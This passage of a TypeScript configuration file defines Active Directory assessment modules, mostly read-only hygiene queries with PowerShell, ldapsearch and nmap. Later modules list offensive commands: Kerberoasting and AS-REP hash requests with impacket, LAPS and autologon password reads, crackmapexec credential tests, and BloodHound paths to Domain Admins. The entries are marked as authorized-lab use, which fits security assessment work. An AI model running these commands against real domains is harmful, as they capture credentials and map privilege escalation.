          { id: 'search-adaccount-locked', title: 'Find locked accounts', command: 'Search-ADAccount -LockedOut -UsersOnly', notes: 'Locked user account visibility.' },
          { id: 'search-adaccount-disabled', title: 'Find disabled accounts', command: 'Search-ADAccount -AccountDisabled -UsersOnly', notes: 'Disabled user inventory.' },
          { id: 'search-adaccount-expired', title: 'Find expired accounts', command: 'Search-ADAccount -AccountExpired -UsersOnly', notes: 'Expired user inventory.' },
          { id: 'search-adaccount-inactive-users', title: 'Find inactive users', command: 'Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly', notes: 'Dormant user review.' },
          { id: 'search-adaccount-inactive-computers', title: 'Find inactive computers', command: 'Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -ComputersOnly', notes: 'Dormant workstation/server review.' },
          { id: 'get-aduser-recent-changes', title: 'Review recently changed users', command: 'Get-ADUser -Filter * -Properties whenChanged | Sort-Object whenChanged -Descending | Select-Object -First 50 Name,SamAccountName,whenChanged', notes: 'Recent identity churn visibility.' },
        ],
      },
      {
        id: 'ldap-account-lifecycle', name: 'LDAP account lifecycle',
        description: 'Cross-platform account state queries.',
        commands: [
          { id: 'ldapsearch-disabled-users', title: 'Find disabled users', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName', notes: 'Disabled account visibility.' },
          { id: 'ldapsearch-locked-users', title: 'Find locked users', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(lockoutTime>=1))" sAMAccountName lockoutTime', notes: 'Locked account visibility.' },
          { id: 'ldapsearch-stale-computers', title: 'Review computer last logon', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=computer)" dNSHostName lastLogonTimestamp operatingSystem', notes: 'Computer lifecycle review.' },
          { id: 'ldapsearch-recently-changed', title: 'Review changed objects', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(whenChanged>=20250101000000.0Z)" cn whenChanged objectClass', notes: 'Adjust timestamp for recent-change review.' },
        ],
      },
    ],
    excluded_capabilities: ['account takeover', 'password reset abuse'],
  },
  {
    id: 'service_accounts', name: 'Service Account Review', category: 'identity',
    description: 'SPN, gMSA, delegation, encryption, and service-account inventory for hygiene review.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-service-accounts', name: 'Windows service-account queries',
        description: 'AD module queries for service account posture.',
        commands: [
          { id: 'get-adserviceaccount', title: 'List managed service accounts', command: 'Get-ADServiceAccount -Filter * -Properties *', notes: 'MSA/gMSA inventory.' },
          { id: 'get-aduser-spn', title: 'List user SPNs', command: "Get-ADUser -LDAPFilter '(servicePrincipalName=*)' -Properties servicePrincipalName,msDS-SupportedEncryptionTypes,PasswordLastSet", notes: 'Service account and SPN visibility.' },
          { id: 'get-adcomputer-spn', title: 'List computer SPNs', command: "Get-ADComputer -LDAPFilter '(servicePrincipalName=*)' -Properties servicePrincipalName,msDS-SupportedEncryptionTypes", notes: 'Computer service principal inventory.' },
          { id: 'get-adobject-gmsa-readers', title: 'Review gMSA password readers', command: 'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword', notes: 'gMSA retrieval scope review.' },
        ],
      },
      {
        id: 'ldap-service-accounts', name: 'LDAP service-account queries',
        description: 'Linux-friendly SPN and gMSA inventory.',
        commands: [
          { id: 'ldapsearch-spn-inventory', title: 'Inventory SPN principals', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(servicePrincipalName=*)" cn sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes', notes: 'SPN and encryption type visibility.' },
          { id: 'ldapsearch-gmsa', title: 'Inventory gMSAs', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(objectClass=msDS-GroupManagedServiceAccount)" cn msDS-GroupMSAMembership servicePrincipalName', notes: 'gMSA object inventory.' },
          { id: 'ldapsearch-delegated-services', title: 'Find delegated services', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(msDS-AllowedToDelegateTo=*))" cn sAMAccountName msDS-AllowedToDelegateTo', notes: 'Delegation posture visibility.' },
        ],
      },
    ],
    excluded_capabilities: ['kerberoasting', 'service account abuse', 'delegation abuse'],
  },
  {
    id: 'laps', name: 'Local Admin and LAPS', category: 'host-access',
    description: 'Local administrator exposure, LAPS/Windows LAPS deployment, and password-management coverage.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-laps-review', name: 'Windows LAPS review',
        description: 'Read LAPS deployment indicators without reading managed passwords.',
        commands: [
          { id: 'get-adcomputer-laps-legacy', title: 'Check legacy LAPS timestamps', command: 'Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Select-Object Name,ms-Mcs-AdmPwdExpirationTime', notes: 'Legacy LAPS coverage signal; does not read passwords.' },
          { id: 'get-adcomputer-windows-laps', title: 'Check Windows LAPS timestamps', command: 'Get-ADComputer -Filter * -Properties msLAPS-PasswordExpirationTime | Select-Object Name,msLAPS-PasswordExpirationTime', notes: 'Windows LAPS coverage signal; does not read passwords.' },
          { id: 'get-laps-admpwd-extendedrights', title: 'Review LAPS extended rights', command: 'Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=corp,DC=com"', notes: 'Who can read legacy LAPS passwords, when module is installed.' },
          { id: 'get-local-admins', title: 'List local administrators', command: 'Get-LocalGroupMember Administrators', notes: 'Local host administrator review.' },
        ],
      },
      {
        id: 'ldap-laps-review', name: 'LDAP LAPS review',
        description: 'Cross-platform LAPS coverage checks.',
        commands: [
          { id: 'ldapsearch-legacy-laps-expiry', title: 'Find legacy LAPS coverage', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(ms-Mcs-AdmPwdExpirationTime=*)" dNSHostName ms-Mcs-AdmPwdExpirationTime', notes: 'Coverage signal only; avoids password attribute.' },
          { id: 'ldapsearch-windows-laps-expiry', title: 'Find Windows LAPS coverage', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(msLAPS-PasswordExpirationTime=*)" dNSHostName msLAPS-PasswordExpirationTime', notes: 'Windows LAPS coverage signal only.' },
        ],
      },
    ],
    excluded_capabilities: ['local admin password retrieval', 'password disclosure'],
  },
  {
    id: 'legacy_protocols', name: 'Legacy Protocol Exposure', category: 'infrastructure',
    description: 'SMB signing, LDAP signing/channel binding clues, NTLM exposure, and legacy service visibility.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-legacy-protocols', name: 'Windows protocol policy',
        description: 'Native policy and registry checks for legacy protocol posture.',
        commands: [
          { id: 'gpresult-security', title: 'Export effective policy', command: 'gpresult /h gpresult.html', notes: 'Effective policy review artifact.' },
          { id: 'auditpol-logon', title: 'Review logon auditing', command: 'auditpol /get /subcategory:"Logon"', notes: 'Logon event coverage.' },
          { id: 'reg-ldap-signing', title: 'Check LDAP signing policy', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity', notes: 'DC LDAP signing setting when run on DC.' },
          { id: 'reg-smb-signing-server', title: 'Check SMB server signing', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature', notes: 'SMB server signing requirement.' },
        ],
      },
      {
        id: 'linux-legacy-protocols', name: 'Linux protocol checks',
        description: 'Network checks for SMB/LDAP/Kerberos posture.',
        commands: [
          { id: 'nmap-smb-security-mode', title: 'Check SMB signing', command: 'nmap -p445 --script smb2-security-mode <IP>', notes: 'SMB signing visibility.' },
          { id: 'nmap-smb-protocols', title: 'Check SMB dialects', command: 'nmap -p445 --script smb-protocols <IP>', notes: 'Legacy SMB protocol visibility.' },
          { id: 'nmap-ldap-rootdse', title: 'Read LDAP RootDSE', command: 'nmap -p389 --script ldap-rootdse <IP>', notes: 'LDAP feature and naming context discovery.' },
          { id: 'nmap-krb5-enum', title: 'Check Kerberos service', command: "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='<DOMAIN>' <IP>", notes: 'Use only in authorized labs; validates Kerberos response posture.' },
        ],
      },
    ],
    excluded_capabilities: ['relay attacks', 'downgrade attacks', 'credential capture'],
  },
  {
    id: 'audit_logging', name: 'Audit and Logging Coverage', category: 'policy',
    description: 'Audit policy, PowerShell logging, event forwarding, and Defender visibility checks.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-audit-policy', name: 'Windows audit policy',
        description: 'Built-in audit and logging visibility.',
        commands: [
          { id: 'auditpol-all', title: 'Dump audit policy', command: 'auditpol /get /category:*', notes: 'Full audit policy baseline.' },
          { id: 'wevtutil-security-info', title: 'Security log configuration', command: 'wevtutil gl Security', notes: 'Security event log size and retention.' },
          { id: 'powershell-scriptblock', title: 'Check script block logging', command: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging', notes: 'PowerShell script block logging policy.' },
          { id: 'powershell-modulelogging', title: 'Check module logging', command: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging', notes: 'PowerShell module logging policy.' },
          { id: 'winrm-service-config', title: 'Inspect WinRM service', command: 'winrm get winrm/config/service', notes: 'Remote management logging and auth context.' },
          { id: 'defender-status', title: 'Review Defender status', command: 'Get-MpComputerStatus', notes: 'Microsoft Defender operational state.' },
          { id: 'defender-preferences', title: 'Review Defender preferences', command: 'Get-MpPreference', notes: 'Defender configuration visibility.' },
        ],
      },
    ],
    excluded_capabilities: ['log clearing', 'defense evasion'],
  },
  {
    id: 'schema_forest', name: 'Schema and Forest Controls', category: 'topology',
    description: 'Forest functional level, optional features, schema metadata, and high-privilege forest groups.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-forest-controls', name: 'Windows forest controls',
        description: 'Forest-wide controls and feature visibility.',
        commands: [
          { id: 'get-adforest-controls', title: 'Review forest controls', command: 'Get-ADForest | Select-Object Name,ForestMode,SchemaMaster,DomainNamingMaster,GlobalCatalogs', notes: 'Forest mode and role holder visibility.' },
          { id: 'get-adoptionalfeature', title: 'List optional features', command: 'Get-ADOptionalFeature -Filter *', notes: 'Recycle Bin and other forest features.' },
          { id: 'get-enterprise-admins', title: 'List Enterprise Admins', command: 'Get-ADGroupMember "Enterprise Admins"', notes: 'Forest-wide privileged membership.' },
          { id: 'get-schema-admins', title: 'List Schema Admins', command: 'Get-ADGroupMember "Schema Admins"', notes: 'Schema-level privileged membership.' },
        ],
      },
      {
        id: 'ldap-forest-controls', name: 'LDAP forest controls',
        description: 'Cross-platform forest metadata discovery.',
        commands: [
          { id: 'ldapsearch-rootdse-forest', title: 'Read forest RootDSE', command: 'ldapsearch -x -H ldap://<IP> -s base -b "" forestFunctionality domainFunctionality domainControllerFunctionality configurationNamingContext schemaNamingContext', notes: 'Functional level and naming context visibility.' },
          { id: 'ldapsearch-optional-features', title: 'Find optional features', command: 'ldapsearch -x -H ldap://<IP> -b "cn=optional features,cn=directory service,cn=windows nt,cn=services,cn=configuration,dc=corp,dc=com" "(objectClass=msDS-OptionalFeature)" cn msDS-OptionalFeatureFlags', notes: 'Optional feature inventory.' },
        ],
      },
    ],
    excluded_capabilities: ['schema modification', 'forest privilege abuse'],
  },
  {
    id: 'tiering_crown_jewels', name: 'Tiering and Crown Jewels', category: 'authorization',
    description: 'Tier-0 object, protected account, adminSDHolder, and high-value group visibility.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'windows-tiering', name: 'Windows tiering checks',
        description: 'High-value identity and delegation context.',
        commands: [
          { id: 'get-protected-users', title: 'List Protected Users', command: 'Get-ADGroupMember "Protected Users"', notes: 'Protected Users membership.' },
          { id: 'get-adminsdholder', title: 'Review AdminSDHolder ACL', command: 'Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=corp,DC=com" | Format-List', notes: 'AdminSDHolder control visibility.' },
          { id: 'get-admincount-users', title: 'List adminCount users', command: "Get-ADUser -LDAPFilter '(adminCount=1)' -Properties adminCount,memberOf", notes: 'Protected/privileged user candidates.' },
          { id: 'get-sensitive-not-delegated', title: 'Review sensitive accounts', command: 'Get-ADUser -Filter * -Properties AccountNotDelegated | Where-Object {$_.AccountNotDelegated -eq $true}', notes: 'Accounts marked sensitive and not delegated.' },
        ],
      },
      {
        id: 'ldap-tiering', name: 'LDAP tiering checks',
        description: 'Cross-platform tier-0 and protected object discovery.',
        commands: [
          { id: 'ldapsearch-adminsdholder', title: 'Read AdminSDHolder', command: 'ldapsearch -x -H ldap://<IP> -b "cn=adminsdholder,cn=system,dc=corp,dc=com" "(objectClass=*)" nTSecurityDescriptor', notes: 'AdminSDHolder descriptor visibility; may require privileges.' },
          { id: 'ldapsearch-admincount-tiering', title: 'Find adminCount objects', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(adminCount=1)" cn sAMAccountName objectClass memberOf', notes: 'Privileged/protected object candidates.' },
          { id: 'ldapsearch-protected-users', title: 'Find Protected Users group', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(cn=Protected Users)" member', notes: 'Protected Users membership via LDAP.' },
        ],
      },
    ],
    excluded_capabilities: ['acl modification', 'adminsdholder abuse'],
  },
  {
    id: 'network_posture', name: 'Network Posture Checks', category: 'infrastructure',
    description: 'Live checks for LLMNR/NBT-NS, SMB signing, LDAP signing, NTLM config, WinRM exposure, open shares, Credential Manager, and Kerberoastable SPNs.',
    supported_modes: ['LINUX_REMOTE', 'WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'smb-signing', name: 'SMB Signing',
        description: 'Verify SMB signing enforcement to prevent NTLM relay.',
        commands: [
          { id: 'nmap-smb-signing', title: 'Check SMB signing (nmap)', command: 'nmap -p445 --script smb2-security-mode,smb-security-mode -T4 <IP>', notes: 'Message signing enabled but not required = relay target.' },
          { id: 'crackmapexec-smb-signing', title: 'Check SMB signing (cme)', command: 'crackmapexec smb <IP/CIDR> --gen-relay-list unsigned_hosts.txt', notes: 'Bulk sweep; outputs relay-ready host list.' },
          { id: 'reg-smb-signing', title: 'Registry check (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v RequireSecuritySignature', notes: '0 = signing not required.' },
        ],
      },
      {
        id: 'llmnr-nbtns', name: 'LLMNR / NBT-NS',
        description: 'Detect active poisonable multicast name resolution protocols.',
        commands: [
          { id: 'nmap-llmnr', title: 'Check LLMNR port (nmap)', command: 'nmap -sU -p5355 --open <subnet>', notes: 'Open = LLMNR active; poisoning possible with Responder.' },
          { id: 'nmap-nbtns', title: 'Check NBT-NS port (nmap)', command: 'nmap -sU -p137 --script nbstat -T4 <IP>', notes: 'NBT-NS port; poisoning vector for NTLMv2 capture.' },
          { id: 'reg-llmnr', title: 'LLMNR GPO registry (Windows)', command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient /v EnableMulticast', notes: '0 = disabled (good). Missing key = enabled (bad).' },
          { id: 'reg-nbtns', title: 'NBT-NS registry (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters /v NodeType', notes: '2 = P-node (no broadcast); 8 = H-node (hybrid).' },
        ],
      },
      {
        id: 'ntlm-config', name: 'NTLM Configuration',
        description: 'Check NTLM authentication level and NTLMv1 downgrade risk.',
        commands: [
          { id: 'reg-lm-compat', title: 'LM Compatibility Level (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel', notes: '5 = NTLMv2 only (secure). <5 = downgrade risk.' },
          { id: 'reg-ntlm-min-client', title: 'NTLMMinClientSec (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0 /v NTLMMinClientSec', notes: '537395200 = require NTLMv2 session + 128-bit.' },
          { id: 'reg-ntlm-min-server', title: 'NTLMMinServerSec (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0 /v NTLMMinServerSec', notes: 'Same flags as above; enforce on server side.' },
        ],
      },
      {
        id: 'ldap-signing', name: 'LDAP Signing / Channel Binding',
        description: 'Verify LDAP signing and channel binding on DCs to prevent LDAP relay.',
        commands: [
          { id: 'nmap-ldap-rootdse', title: 'LDAP RootDSE (nmap)', command: 'nmap -p389 --script ldap-rootdse -T4 <IP>', notes: 'Checks LDAP exposure and service metadata.' },
          { id: 'ldapsearch-caps', title: 'LDAP capabilities (ldapsearch)', command: 'ldapsearch -x -H ldap://<IP> -s base -b "" supportedCapabilities supportedControl', notes: 'OID 1.2.840.113556.1.4.1791 = LDAP signing enforced.' },
          { id: 'reg-ldap-signing', title: 'LDAP signing registry (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LDAPServerIntegrity', notes: '2 = required. 1 = negotiate. 0 = disabled.' },
          { id: 'reg-ldap-channel-binding', title: 'Channel binding registry (Windows)', command: 'reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v LdapEnforceChannelBinding', notes: '2 = always. 1 = when supported. 0 = never.' },
        ],
      },
      {
        id: 'winrm-exposure', name: 'WinRM Exposure',
        description: 'Check WinRM accessibility as a lateral movement vector.',
        commands: [
          { id: 'nmap-winrm', title: 'Check WinRM ports (nmap)', command: 'nmap -p5985,5986 -sV -T4 <IP>', notes: '5985=HTTP, 5986=HTTPS. Open = Evil-WinRM attack surface.' },
          { id: 'crackmapexec-winrm', title: 'Test WinRM auth (cme)', command: 'crackmapexec winrm <IP> -u <user> -p <pass>', notes: 'Validates credential access via WinRM.' },
          { id: 'winrm-config', title: 'WinRM config (Windows)', command: 'winrm get winrm/config/service', notes: 'Shows AllowUnencrypted and Auth method settings.' },
          { id: 'winrm-listeners', title: 'WinRM listeners (Windows)', command: 'winrm enumerate winrm/config/listener', notes: 'Shows which interfaces WinRM is bound to.' },
        ],
      },
      {
        id: 'open-shares', name: 'Open SMB Shares',
        description: 'Identify SMB shares accessible without credentials.',
        commands: [
          { id: 'smbclient-null', title: 'Null session share list (impacket)', command: "impacket-smbclient ''@<IP> -c shares", notes: 'Lists shares accessible with no credentials.' },
          { id: 'smbclient-guest', title: 'Guest share access (impacket)', command: 'impacket-smbclient guest:@<IP> -c shares', notes: 'Tests guest account share visibility.' },
          { id: 'nmap-smb-enum-shares', title: 'Enumerate shares (nmap)', command: 'nmap -p445 --script smb-enum-shares <IP>', notes: 'Shows share names, types, and anonymous access.' },
          { id: 'net-share-local', title: 'List local shares (Windows)', command: 'net share', notes: 'Local share inventory when run on target.' },
        ],
      },
      {
        id: 'cred-manager', name: 'Credential Manager Secrets',
        description: 'Audit stored credentials in Credential Manager and Winlogon autologon keys.',
        commands: [
          { id: 'cmdkey-list', title: 'List Credential Manager entries', command: 'cmdkey /list', notes: 'Shows stored Windows credentials (run as target user).' },
          { id: 'reg-winlogon-autologon', title: 'Winlogon autologon check (Windows)', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword', notes: 'Plaintext password in registry if autologon is set.' },
          { id: 'reg-winlogon-user', title: 'Winlogon autologon user', command: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultUserName', notes: 'Username for autologon — confirm with DefaultPassword.' },
          { id: 'impacket-reg-winlogon', title: 'Remote Winlogon check (impacket)', command: 'impacket-reg <domain>/<user>:<pass>@<IP> query -keyName "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', notes: 'Remote registry read of Winlogon keys.' },
        ],
      },
      {
        id: 'kerberoast-spn', name: 'Kerberoastable Service Accounts',
        description: 'Enumerate SPN-bearing accounts (especially sql_svc) without requesting tickets.',
        commands: [
          { id: 'getuserspns-list', title: 'List Kerberoastable accounts (impacket)', command: 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP>', notes: 'Lists accounts with SPNs. Look for sql_svc, svc_*, MSSQLSvc/.' },
          { id: 'ldapsearch-spn-kerberoast', title: 'LDAP SPN search', command: 'ldapsearch -x -H ldap://<IP> -b "dc=corp,dc=com" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes', notes: 'Surfaces SPN accounts and encryption type (RC4 = easier crack).' },
          { id: 'get-aduser-spn', title: 'PowerShell SPN enumeration', command: "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes | Select SAMAccountName,ServicePrincipalName,msDS-SupportedEncryptionTypes", notes: 'Include msDS-SupportedEncryptionTypes — RC4 only = prime target.' },
          { id: 'kerberoast-request', title: 'Kerberoast (request tickets)', command: 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request', notes: 'Requests TGS tickets for offline cracking — authorized use only.' },
        ],
      },
    ],
    excluded_capabilities: ['active poisoning', 'relay attack execution', 'credential capture'],
  },
]

const architectureAttackModules: CollectionModule[] = [
  {
    id: 'bloodhound_graph_collection', name: 'BloodHound and Graph Collection', category: 'graph',
    description: 'SharpHound, bloodhound-python, BOFHound, RustHound-CE, AzureHound, trust/ACL/session collection, custom Cypher path queries, and attack-path graph ingestion.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'bh-collection', name: 'Collection methods',
        description: 'Collector invocation for Windows and Linux.',
        commands: [
          { id: 'bh-col-1', title: 'SharpHound CE — full collection', command: 'SharpHound.exe -c DCOnly,Group,LocalAdmin,Session,Trusts,ACL --zipfilename adbygod-bh.zip', notes: 'Full BloodHound CE collection. Use DCOnly first for low noise.' },
          { id: 'bh-col-2', title: 'SharpHound CE — DCOnly (low noise)', command: 'SharpHound.exe -c DCOnly,Group,Trusts --zipfilename adbygod-bh-dc.zip', notes: 'Skips local-admin and session enumeration — minimal lateral noise.' },
          { id: 'bh-col-3', title: 'bloodhound-python — all methods', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c all --zip', notes: 'Linux-side full relationship collection.' },
          { id: 'bh-col-4', title: 'bloodhound-python — DCOnly', command: 'bloodhound-python -d <domain> -u <user> -p <pass> -dc <dc> -c DCOnly,Group,Trusts --zip', notes: 'Lower-noise Linux collection.' },
          { id: 'bh-col-5', title: 'RustHound-CE collection', command: 'rusthound-ce -d <domain> -u <user> -p <pass> --dc <dc> --zip --output /tmp/bh', notes: 'Rust-based alternative collector.' },
          { id: 'bh-col-6', title: 'BOFHound import from LDAP logs', command: "python3 BOFHound.py -i ldap_logs/ -d <domain> --type 'ldap'", notes: 'Builds BloodHound data from LDAP event logs — no live collection.' },
        ],
      },
      {
        id: 'bh-azure', name: 'AzureHound / Entra collection',
        description: 'Azure-side graph collection for hybrid environments.',
        commands: [
          { id: 'bh-az-1', title: 'AzureHound with credentials', command: "azurehound -u <UPN> -p '<Password>' list --tenant <TenantID> -o azurehound.zip", notes: 'Collects Entra users, groups, roles, apps, and subscriptions.' },
          { id: 'bh-az-2', title: 'AzureHound with token', command: 'azurehound -t <AccessToken> list --tenant <TenantID> -o azurehound.zip', notes: 'Token-based collection — preferred over plaintext credentials.' },
        ],
      },
      {
        id: 'bh-analysis', name: 'BloodHound Cypher queries',
        description: 'Key analysis queries for attack path review.',
        commands: [
          { id: 'bh-cypher-1', title: 'Find shortest path to Domain Admins', command: "MATCH p=shortestPath((n)-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.COM'})) WHERE NOT n=m RETURN p", notes: 'Core DA path analysis — run in BloodHound query editor.' },
          { id: 'bh-cypher-2', title: 'Find all kerberoastable DA paths', command: "MATCH (u:User {hasspn:true})-[r:MemberOf|AdminTo*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.COM'}) RETURN u.name", notes: 'High-value kerberoast targets with DA paths.' },
          { id: 'bh-cypher-3', title: 'Find unconstrained delegation hosts', command: 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name', notes: 'All unconstrained delegation computers in graph.' },
          { id: 'bh-cypher-4', title: 'Find owned principals with paths', command: "MATCH p=shortestPath((n {owned:true})-[*1..]->(m:Group {name:'DOMAIN ADMINS@CORP.COM'})) RETURN p", notes: 'Owned nodes that have paths to DA.' },
        ],
      },
    ],
    excluded_capabilities: ['aggressive collection without authorization', 'credential theft'],
  },
  {
    id: 'credential_access_architecture', name: 'Credential Access Architecture', category: 'credential-access',
    description: 'AS-REP roasting, Kerberoasting, Timeroasting, password spraying, relay, coercion, DPAPI, LAPS/gMSA reads, LSASS/SAM/NTDS/DCC2, and cracking workflow coverage.',
    supported_modes: ['WINDOWS_LOCAL', 'WINDOWS_REMOTE', 'LINUX_REMOTE', 'IMPORT'], read_only: false,
    command_groups: [
      {
        id: 'cred-asrep', name: 'AS-REP roasting surface',
        description: 'Identify pre-auth disabled accounts without requesting hashes.',
        commands: [
          { id: 'cred-asrep-1', title: 'Find AS-REP roastable (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName", notes: 'Flags DONT_REQUIRE_PREAUTH without requesting hashes.' },
          { id: 'cred-asrep-2', title: 'Find AS-REP roastable (PowerShell)', command: 'Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,Enabled | Where-Object {$_.Enabled} | Select-Object SamAccountName,DistinguishedName', notes: 'Windows-side pre-auth disabled user inventory.' },
          { id: 'cred-asrep-3', title: 'Request AS-REP hashes (impacket)', command: 'impacket-GetNPUsers <domain>/ -dc-ip <IP> -usersfile <UserList> -format hashcat -outputfile asrep.txt', notes: 'Requests AS-REP material for offline cracking — authorized lab only.' },
        ],
      },
      {
        id: 'cred-kerberoast', name: 'Kerberoasting surface',
        description: 'SPN account discovery and ticket request surface.',
        commands: [
          { id: 'cred-kerb-1', title: 'Find Kerberoastable SPNs (impacket)', command: 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP>', notes: 'Lists SPN-bearing accounts; RC4-only encryption = easier crack.' },
          { id: 'cred-kerb-2', title: 'Find Kerberoastable SPNs (LDAP)', command: "ldapsearch -x -H ldap://<IP> -b 'dc=corp,dc=com' '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes adminCount", notes: 'Surfaces SPN accounts and encryption type from Linux.' },
          { id: 'cred-kerb-3', title: 'Find Kerberoastable SPNs (PowerShell)', command: "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,msDS-SupportedEncryptionTypes,adminCount | Select-Object SamAccountName,ServicePrincipalName,msDS-SupportedEncryptionTypes,adminCount", notes: 'Windows-side Kerberoast surface with encryption type.' },
          { id: 'cred-kerb-4', title: 'Request TGS tickets (authorized lab)', command: 'impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request -outputfile kerberoast.txt', notes: 'Authorized-lab TGS ticket request for offline cracking.' },
        ],
      },
      {
        id: 'cred-hash-ref', name: 'Hash type reference and LAPS/gMSA',
        description: 'Timeroasting, hash type matrix, and managed credential reads.',
        commands: [
          { id: 'cred-hash-1', title: 'Hash type matrix (hashcat modes)', command: 'NTLM:1000  Net-NTLMv1:5500  Net-NTLMv2:5600  AS-REP:18200  TGS-RC4:13100  TGS-AES:19700  DCC2:2100  DPAPI:15900', notes: 'Reference for cracking workflow and evidence labeling.' },
          { id: 'cred-hash-2', title: 'Stale machine accounts (Timeroast surface)', command: 'Get-ADComputer -Filter * -Properties PasswordLastSet | Where-Object {$_.PasswordLastSet -lt (Get-Date).AddDays(-30)} | Select-Object SamAccountName,PasswordLastSet', notes: 'Stale machine passwords increase Timeroast feasibility.' },
          { id: 'cred-hash-3', title: 'LAPS password read (authorized)', command: "Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' | Where-Object {$_.'ms-Mcs-AdmPwd'} | Select-Object Name,'ms-Mcs-AdmPwd'", notes: 'Read LAPS passwords where the operator account has permission.' },
          { id: 'cred-hash-4', title: 'gMSA accounts inventory', command: 'Get-ADServiceAccount -Filter * -Properties msDS-ManagedPassword,PrincipalsAllowedToRetrieveManagedPassword | Select-Object Name,PrincipalsAllowedToRetrieveManagedPassword', notes: 'Lists gMSA accounts and who can read the managed password.' },
        ],
      },
    ],
    excluded_capabilities: ['unauthorized credential dumping', 'hash cracking outside approved scope'],
  },
  {
    id: 'credential_dumping_deep_dive', name: 'Credential Dumping Deep Dive', category: 'credential-access',
